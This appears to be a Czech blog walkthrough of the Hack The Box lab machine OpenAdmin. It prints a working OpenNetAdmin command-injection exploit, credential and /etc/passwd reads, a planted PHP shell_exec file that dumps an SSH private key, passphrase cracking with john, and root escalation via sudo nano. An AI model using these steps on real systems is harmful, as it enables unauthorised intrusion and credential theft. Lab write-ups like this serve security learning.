---
layout: post
author: Tomáš Matějíček
title: "OpenAdmin"
date: 2020-12-25
tags: linux exploit sudo
---

[OpenAdmin](https://www.hackthebox.eu/home/machines/profile/222) je jednoduchý linuxový box. Počáteční přístup získáš využitím OpenNetAdmin RCE a na úroveň uživatele se posuneš díky nalezenému heslu. Pak pomocí SSH přesměrování portů získáš přístup k internímu webu a tím i k zašifrovanému SSH privátnímu klíči. Po prolomení hesla získáš přístup k druhému uživateli. Zvýšení oprávnění na správce provedeš pomocí kombinace sudo a nano.

### Vyhledání otevřených portů
`IP=10.10.10.171;ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n"​ "," | sed s/,$//);nmap -p $ports -A -sC -sV -v $IP`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Úprava /etc/hosts
10.10.10.171	openadmin.htb

### Vyhledání složek na serveru
`dirb http://openadmin.htb`
```
=> DIRECTORY: http://openadmin.htb/artwork/
=> DIRECTORY: http://openadmin.htb/music/
```

### Vyhlední odkazů
`wget -r -nd --delete-after -nv --ignore-tags=img,link,script http://openadmin.htb/music/`
```
URL:http://openadmin.htb/ona/
```
### Identifikace webové aplikace
`whatweb http://openadmin.htb/ona/`
```
http://openadmin.htb/ona/ [200 OK] Apache[2.4.29], Cookies[ONA_SESSION_ID,ona_context_name], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], Script[javascript,text/javascript], Title[OpenNetAdmin :: 0wn Your Network]
```

### Vyhledání exploitu
`searchsploit -w opennetadmin`

```
---------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                                              |  URL
---------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                                                               | https://www.exploit-db.com/exploits/26682
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                | https://www.exploit-db.com/exploits/47772
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                 | https://www.exploit-db.com/exploits/47691
---------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
```

### Zobrazení a stažení exploitu
`curl https://www.exploit-db.com/raw/47691`
```
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```

`curl https://www.exploit-db.com/raw/47691 -o opennetadmin-exploit.sh`

### Spuštění exploitu
```
dos2unix opennetadmin-exploit.sh
chmod +x opennetadmin-exploit.sh
./opennetadmin-exploit.sh "http://openadmin.htb/ona/"
```

### Zjištění uživatelů na cílovém serveru
`cat /etc/passwd`
```
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

### Zjištění přístupovéch údajů k databázi
`cat ./local/config/database_settings.inc.php`
```
$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => '__CENSORED__',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
### Přihlášení k ssh pomocí nalezeného hesla
`ssh jimmy@openadmin.htb`

### Vyhledání zapisovatelných složek
`find / -type d -writable 2> /dev/null`
```
/var/www/internal
```
### Zjištění konfigurace web-site
`cat /etc/apache2/sites-enabled/internal.conf`
```
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
### Přihlášení k ssh s přesměrováním portů
`ssh -L 52846:127.0.0.1:52846 jimmy@openadmin.htb`

### Vytvoření PHP souboru který zobrazí privátní klíč uživatele joanna
`echo "<?php echo shell_exec('cat /home/joanna/.ssh/id_rsa');" > /var/www/internal/key.php`

### Zobrazení PHP souboru na interní webu a získání privátního klíče
<http://127.0.0.1:52846/key.php>
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
.....
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```
### Slovníkový útok na heslo privátního klíče
```
/usr/share/john/ssh2john.py OpenAdmin_joanna_id_rsa > OpenAdmin_joanna_id_rsa.john
/usr/sbin/john OpenAdmin_joanna_id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
```
`__CENSORED__      (OpenAdmin_joanna_id_rsa)`

### Přihlášení k SSH pomocí privátního klíče
`ssh -i OpenAdmin_joanna_id_rsa joanna@openadmin.htb`

### Zobrazení obsahu souboru user.txt
`cat user.txt`
`__CENSORED__`

### Zobrazení nastavení sudo
`sudo -l`
```
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

### Spuštění nano, zvýšení oprávnění a vypsání obsahu souboru root.txt
`sudo /bin/nano /opt/priv`
`Ctrl+R`
`Ctrl+X`
`cat /root/root.txt`
__CENSORED__
